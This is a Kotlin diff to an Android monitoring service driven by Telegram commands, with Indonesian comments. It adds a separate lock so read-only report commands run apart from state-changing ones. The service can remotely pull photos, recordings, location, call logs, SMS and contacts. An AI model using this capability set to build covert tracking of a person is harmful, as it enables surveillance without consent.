@@ -122,6 +122,11 @@ class MonitoringService : Service() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + scopeErrorHandler)
     private val commandLock = kotlinx.coroutines.sync.Mutex()
     private val controlLock = kotlinx.coroutines.sync.Mutex()
+    // Jalur laporan baca-saja (issue #1921): handler laporan
+    // berat (digest/brief/dsb.) tak lagi menahan perintah
+    // ubah-keadaan di commandLock, dan sebaliknya; laporan
+    // tetap serial sesamanya di kunci ini.
+    private val queryLock = kotlinx.coroutines.sync.Mutex()
     private val loginLock = kotlinx.coroutines.sync.Mutex()
     private val locationFetchMutex = kotlinx.coroutines.sync.Mutex()
     private var lastLoginJob: kotlinx.coroutines.Job? = null
@@ -475,6 +480,15 @@ class MonitoringService : Service() {
         )
         private val CONTROL_COMMANDS = setOf("/stop", "/pause", "/resume", "/restart", "/logout", "/clearqueue", "/lock")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/record", "/recordvideo", "/location", "/lastcalls", "/lastsms", "/lastnotify", "/contacts", "/history", "/track", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/brief", "/alive", "/checkdead", "/screentime", "/digest", "/weekly", "/alertness", "/audit")
+        // Perintah laporan BACA-SAJA murni (issue #1921):
+        // handlernya hanya membaca keadaan lalu membalas,
+        // tanpa mengubah keadaan, tanpa aksi perangkat, dan
+        // tanpa tangkapan media. Mereka berjalan di queryLock
+        // agar yang berat tak menahan jalur perintah lain.
+        // Perintah tangkapan (/photo, /screenshot, /location
+        // dsb.) SENGAJA tidak di sini: mereka memakai sumber
+        // daya perangkat bersama dan tetap di commandLock.
+        private val QUERY_COMMANDS = setOf("/status", "/battery", "/uptime", "/storage", "/perms", "/version", "/log", "/brief", "/digest", "/weekly", "/screentime", "/alertness", "/history", "/apps", "/track", "/alive", "/audit", "/lastnotify", "/checkdead", "/lastcalls", "/lastsms", "/contacts", "/help")
         private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/emergency", "minggu" to "/weekly", "laporan" to "/weekly", "pulang" to "/curfew", "jejak" to "/track", "waspada" to "/alertness", "hilang" to "/lost", "jemput" to "/pickup", "cekmati" to "/checkdead", "ujimati" to "/checkdead", "sembuh" to "/recover", "pulih" to "/recover", "layar" to "/screentime", "screentime" to "/screentime", "kendara" to "/driving", "berkendara" to "/driving", "kendaraan" to "/driving", "datasaver" to "/datasaver", "hematkuota" to "/datasaver", "kuota" to "/datasaver", "restore" to "/restore", "screenshot" to "/screenshot", "status" to "/status")
         // Frasa perintah dua kata (issue #777): bentuk berjarak dari
         // perintah yang sama — sebelumnya hanya kata pertama yang
@@ -2323,7 +2337,12 @@ class MonitoringService : Service() {
         while (!held) {
             if (controlLock.tryLock()) {
                 if (commandLock.tryLock()) {
-                    held = true
+                    if (queryLock.tryLock()) {
+                        held = true
+                    } else {
+                        commandLock.unlock()
+                        controlLock.unlock()
+                    }
                 } else {
                     controlLock.unlock()
                 }
@@ -2337,6 +2356,7 @@ class MonitoringService : Service() {
         return try {
             block()
         } finally {
+            queryLock.unlock()
             commandLock.unlock()
             controlLock.unlock()
         }
@@ -3462,45 +3482,72 @@ class MonitoringService : Service() {
                                         }
                                     }
                                 }
-                                if (!adoptionRejected && !followFailedSilently && !followTimedOut) lock.withLock {
-                                    val ownerNow = isOwner(senderId)
-                                    val privateNow = ownerNow && isPrivate
-                                    val restoreHandled = privateNow && message != null && handleRestoreIncoming(message, msgChatId)
-                                    if (!restoreHandled) {
-                                        val balasAngka = consumePendingInput(rawText, messageDate, ownerNow, chatOk, senderId, isPrivate, msgChatId, adoptionDoneSec)
-                                        if (!balasAngka && command.startsWith("/")) {
-                                            if (!slashVetoed) {
-                                                val input = aliasInput ?: if (arg.isEmpty()) command else "$command $arg"
-                                                handleTelegramCommand(input, messageDate, ownerNow, chatOk, senderId = senderId, privateChat = isPrivate, adoptionDoneSec = adoptionDoneSec, messageId = message?.messageId ?: 0L)
-                                            }
-                                        } else if (!balasAngka) {
-                                            if (aliasInput != null && privateNow) {
-                                                handleTelegramCommand(aliasInput, messageDate, ownerNow, chatOk, senderId, true, adoptionDoneSec, messageId = message?.messageId ?: 0L)
-                                            } else if (intentInput != null && privateNow) {
-                                                handleTelegramCommand(intentInput, messageDate, ownerNow, chatOk, senderId, true, adoptionDoneSec, messageId = message?.messageId ?: 0L)
-                                            } else if (privateNow) {
-                                                // Dua perintah satu pesan
-                                                // (issue #844): jangan
-                                                // gugur senyap — sarankan
-                                                // kirim terpisah. Tiap
-                                                // sisi diselesaikan lewat
-                                                // pipa pesan tunggal;
-                                                // sisi tak dikenal atau
-                                                // ter-veto membatalkan
-                                                // saran.
-                                                val sides = try { IntentParser.multiIntentSides(rawText) } catch (_: Exception) { null }
-                                                val leftCmd = sides?.let { resolveNaturalSide(it.first) }
-                                                val rightCmd = sides?.let { resolveNaturalSide(it.second) }
-                                                if (leftCmd != null && rightCmd != null && leftCmd != rightCmd) {
-                                                    try {
-                                                        sendToTelegram("Kirim satu-satu ya 🙏 Pesan tadi terbaca dua perintah: <b>$leftCmd</b> dan <b>$rightCmd</b>. Kirim terpisah agar dua-duanya jalan.")
-                                                    } catch (_: Exception) {
+                                if (!adoptionRejected && !followFailedSilently && !followTimedOut) {
+                                    // Fase 1 (issue #1921): keadaan bersama
+                                    // (restore + konsumsi input tertunda) tetap
+                                    // serial di kunci kelas seperti semula; yang
+                                    // direncanakan di sini lalu dijalankan di
+                                    // fase 2 pada jalur sesuai kelas perintah.
+                                    var ownerNow = false
+                                    var rencanaInput: String? = null
+                                    var rencanaPrivat = false
+                                    var rencanaSaran: Pair<String, String>? = null
+                                    lock.withLock {
+                                        ownerNow = isOwner(senderId)
+                                        val privateNow = ownerNow && isPrivate
+                                        val restoreHandled = privateNow && message != null && handleRestoreIncoming(message, msgChatId)
+                                        if (!restoreHandled) {
+                                            val balasAngka = consumePendingInput(rawText, messageDate, ownerNow, chatOk, senderId, isPrivate, msgChatId, adoptionDoneSec)
+                                            if (!balasAngka && command.startsWith("/")) {
+                                                if (!slashVetoed) {
+                                                    rencanaInput = aliasInput ?: if (arg.isEmpty()) command else "$command $arg"
+                                                    rencanaPrivat = isPrivate
+                                                }
+                                            } else if (!balasAngka) {
+                                                if (aliasInput != null && privateNow) {
+                                                    rencanaInput = aliasInput
+                                                    rencanaPrivat = true
+                                                } else if (intentInput != null && privateNow) {
+                                                    rencanaInput = intentInput
+                                                    rencanaPrivat = true
+                                                } else if (privateNow) {
+                                                    // Dua perintah satu pesan
+                                                    // (issue #844): jangan
+                                                    // gugur senyap — sarankan
+                                                    // kirim terpisah. Tiap
+                                                    // sisi diselesaikan lewat
+                                                    // pipa pesan tunggal;
+                                                    // sisi tak dikenal atau
+                                                    // ter-veto membatalkan
+                                                    // saran.
+                                                    val sides = try { IntentParser.multiIntentSides(rawText) } catch (_: Exception) { null }
+                                                    val leftCmd = sides?.let { resolveNaturalSide(it.first) }
+                                                    val rightCmd = sides?.let { resolveNaturalSide(it.second) }
+                                                    if (leftCmd != null && rightCmd != null && leftCmd != rightCmd) {
+                                                        rencanaSaran = leftCmd to rightCmd
                                                     }
                                                 }
                                             }
                                         }
+                                        Unit
                                     }
-                                    Unit
+                                    // Fase 2: handler berjalan di jalurnya.
+                                    // Laporan baca-saja berat (QUERY_COMMANDS) di
+                                    // queryLock; kontrol tetap di controlLock;
+                                    // sisanya di commandLock seperti semula.
+                                    val inputEksekusi = rencanaInput
+                                    if (inputEksekusi != null) {
+                                        val jalur = if (control) controlLock else if (inputEksekusi.substringBefore(" ") in QUERY_COMMANDS) queryLock else commandLock
+                                        jalur.withLock {
+                                            handleTelegramCommand(inputEksekusi, messageDate, ownerNow, chatOk, senderId = senderId, privateChat = rencanaPrivat, adoptionDoneSec = adoptionDoneSec, messageId = message?.messageId ?: 0L)
+                                        }
+                                    } else if (rencanaSaran != null) {
+                                        val (kiriSaran, kananSaran) = rencanaSaran!!
+                                        try {
+                                            sendToTelegram("Kirim satu-satu ya 🙏 Pesan tadi terbaca dua perintah: <b>$kiriSaran</b> dan <b>$kananSaran</b>. Kirim terpisah agar dua-duanya jalan.")
+                                        } catch (_: Exception) {
+                                        }
+                                    }
                                 }
                             } finally {
                                 if (adoptionWait) {
@@ -3725,7 +3772,11 @@ class MonitoringService : Service() {
         // menahan /lock & /stop dari teks di belakangnya —
         // prioritas terbalik. Kini hanya perintah kontrol yang
         // memakai controlLock; sisanya commandLock seperti teks.
-        val lock = if (gateCommand in CONTROL_COMMANDS) controlLock else commandLock
+        // Tombol jalankan laporan baca-saja ikut queryLock
+        // (issue #1921); saklar tetap di commandLock karena
+        // perhitungan ulangnya di dalam kunci (#901) harus
+        // serial terhadap perintah ketik pengubah yang sama.
+        val lock = if (gateCommand in CONTROL_COMMANDS) controlLock else if (toggle == null && gateCommand in QUERY_COMMANDS) queryLock else commandLock
         lock.withLock {
             // Untuk saklar, keadaan dibaca & perintah dihitung
             // ULANG di dalam kunci (issue #901): bacaan di luar
